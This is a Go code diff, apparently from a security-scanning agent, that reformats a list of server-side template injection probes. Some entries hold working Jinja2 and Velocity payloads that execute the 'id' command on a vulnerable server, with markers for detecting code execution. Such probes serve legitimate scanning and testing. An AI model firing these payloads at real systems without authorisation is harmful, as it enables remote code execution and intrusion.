@@ -39,11 +39,11 @@ func (a *Agent) SystemPrompt() string { return a.systemPrompt }
 
 // sstiProbe holds a template injection probe.
 type sstiProbe struct {
-	payload       string
-	engine        string
-	detectMath    bool   // true if response should contain "49"
-	detectMarker  string // specific string to look for in response
-	rceIndicator  bool   // true if this probe should produce RCE evidence
+	payload      string
+	engine       string
+	detectMath   bool   // true if response should contain "49"
+	detectMarker string // specific string to look for in response
+	rceIndicator bool   // true if this probe should produce RCE evidence
 }
 
 var probes = []sstiProbe{
@@ -62,8 +62,8 @@ var probes = []sstiProbe{
 		detectMarker: "type",
 	},
 	{
-		payload:     "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
-		engine:      EngineJinja2,
+		payload:      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+		engine:       EngineJinja2,
 		detectMarker: "uid=",
 		rceIndicator: true,
 	},
@@ -89,8 +89,8 @@ var probes = []sstiProbe{
 
 	// --- Velocity specific ---
 	{
-		payload: "#set($e=\"e\")${e.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"e\".class).invoke(e.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}",
-		engine:  EngineVelocity,
+		payload:      "#set($e=\"e\")${e.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"e\".class).invoke(e.class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}",
+		engine:       EngineVelocity,
 		detectMarker: "Process",
 		rceIndicator: true,
 	},
